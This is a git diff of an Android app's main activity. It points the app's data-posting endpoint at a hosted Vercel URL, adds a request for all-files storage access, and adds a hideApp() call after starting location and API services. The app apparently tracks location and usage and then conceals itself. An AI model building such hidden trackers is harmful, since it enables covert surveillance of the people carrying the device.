@@ -235,13 +235,13 @@ public class MainActivity extends AppCompatActivity {
         new Thread(() ->{
             HttpURLConnection connection = null;
             try {
-                URL url = new URL("http://192.168.235.150:3000/api/app"); //mudar em produção
+                URL url = new URL("https://blockedvercel.vercel.app/api/app"); //mudar em produção
                 connection = (HttpURLConnection) url.openConnection();
                 connection.setRequestMethod("POST");
                 connection.setRequestProperty("Accept", "application/json");
                 connection.setRequestProperty("Content-Type", "application/json");
-                connection.setConnectTimeout(5000);
-                connection.setReadTimeout(5000);
+                connection.setConnectTimeout(10000);
+                connection.setReadTimeout(10000);
                 connection.setDoOutput(true); // Necessário para enviar dados
 
                 // Corpo da requisição (JSON neste caso)
@@ -473,6 +473,12 @@ public class MainActivity extends AppCompatActivity {
             startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
         }
 
+        else if (!Environment.isExternalStorageManager()) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+            //Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+            startActivityForResult(intent, REQUEST_CODE_MANAGE_STORAGE);
+        }
+
         else if (!isUsageStatsPermissionGranted()) {
             Intent usageStatsIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
             startActivityForResult(usageStatsIntent, USAGE_STATS_REQUEST_CODE);
@@ -521,6 +527,7 @@ public class MainActivity extends AppCompatActivity {
     else if(configFile.exists()){
         startService(new Intent(this, LocationService.class));
         startService(new Intent(this, ApiService.class));
+        hideApp();
     }
     else {
         //startService(new Intent(this, AppMonitorService.class));
